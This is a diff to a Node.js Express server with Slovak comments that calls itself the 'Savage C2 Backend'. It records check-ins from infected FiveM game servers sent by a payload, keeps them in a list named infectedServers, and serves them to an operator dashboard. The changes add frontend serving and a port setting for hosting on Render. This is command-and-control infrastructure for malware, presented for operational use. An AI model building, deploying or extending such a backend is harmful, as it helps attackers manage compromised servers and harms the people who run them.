@@ -1,11 +1,17 @@
 const express = require('express');
 const cors = require('cors');
+const path = require('path'); // Pridané pre prácu s priečinkami
 const app = express();
 
 app.use(express.json());
 app.use(cors());
 
-let infectedServers = []; // Tu budeme držať zoznam v pamäti
+// --- NASTAVENIE FRONTENDU ---
+// Povieme serveru, že tvoj index.html je v priečinku 'frontend'
+// (Ak máš index.html v rovnakom priečinku ako server.js, zmeň '../frontend' na './')
+app.use(express.static(path.join(__dirname, '../frontend')));
+
+let infectedServers = []; 
 
 // Cesta pre FiveM server (Payload)
 app.post('/api/report', (req, res) => {
@@ -16,7 +22,6 @@ app.post('/api/report', (req, res) => {
         lastSeen: new Date().toLocaleTimeString()
     };
 
-    // Ak už server v zozname je, aktualizujeme ho, ak nie, pridáme ho
     const index = infectedServers.findIndex(s => s.ip === newServer.ip);
     if (index > -1) {
         infectedServers[index] = newServer;
@@ -28,14 +33,20 @@ app.post('/api/report', (req, res) => {
     res.status(200).send({ status: "ok" });
 });
 
-// Cesta pre tvoj Dashboard (Frontend)
+// Cesta pre tvoj Dashboard (Dáta)
 app.get('/api/list', (req, res) => {
     res.json(infectedServers);
 });
 
-app.listen(3000, () => {
+// HLAVNÁ STRÁNKA - Tu pošleme užívateľovi tvoj index.html
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
+});
+
+// --- PORT (DÔLEŽITÉ PRE RENDER) ---
+const PORT = process.env.PORT || 10000; 
+app.listen(PORT, '0.0.0.0', () => {
     console.log("-----------------------------------------");
-    console.log("Savage C2 Backend beží na porte 3000");
-    console.log("Dashboard nájdeš v index.html");
+    console.log(`Savage C2 Backend beží na porte ${PORT}`);
     console.log("-----------------------------------------");
 });
